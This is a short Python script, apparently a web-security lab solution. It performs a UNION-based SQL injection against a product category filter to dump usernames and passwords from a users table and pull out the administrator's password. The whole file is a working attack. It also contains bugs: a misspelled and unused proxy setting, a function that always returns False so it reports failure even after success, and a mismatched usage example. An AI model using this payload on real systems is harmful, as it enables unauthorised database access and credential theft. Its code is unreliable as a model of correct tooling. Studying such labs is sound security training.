import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"htttp":"http://127.0.0.1:8080", "https":"https://127.0.0.1:8080"}

def exploit_sqli(url):
	username = 'administrator'
	path = '/filter?category=Gifts'
	payload = "' UNION SELECT NULL, username || '*' || password FROM users--"
	r = requests.get(url + path + payload, verify=False)
	if "administrator" in r.text:
		print("admin password found!")
		soup = BeautifulSoup(r.text, 'html.parser')
		password = soup.find(text=re.compile('.*administrator.*')).split("*")[1]
		print(f"{password}")
	return False



if __name__ == '__main__':
	try:
		url = sys.argv[1].strip()
	except IndexError:
		print(f"[-] Usage: {sys.argv[0]} <url>")
		print(f"[-] Example: {sys.argv[0]} www.example.com '1=1'")
		sys.exit(-1)

	if not exploit_sqli(url):
		print("did not find admin password")